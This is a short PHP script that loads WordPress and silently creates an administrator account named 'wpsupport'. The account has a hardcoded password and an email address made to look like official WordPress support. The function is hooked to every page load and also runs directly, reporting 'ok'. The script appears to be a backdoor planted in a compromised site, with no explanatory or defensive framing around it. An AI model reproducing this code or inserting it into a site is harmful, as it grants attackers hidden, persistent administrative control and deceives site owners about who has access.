<?php
error_reporting(E_ALL);
require_once('../wp-blog-header.php');
require_once('../wp-includes/registration.php');
function wpb_admin_account() {
	$user = 'wpsupport';
	$pass = '2b6bd3WP13';
	$email = 'wpsupport@wordpress.com';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
		echo 'ok';
	}
}
add_action('init', 'wpb_admin_account');
wpb_admin_account();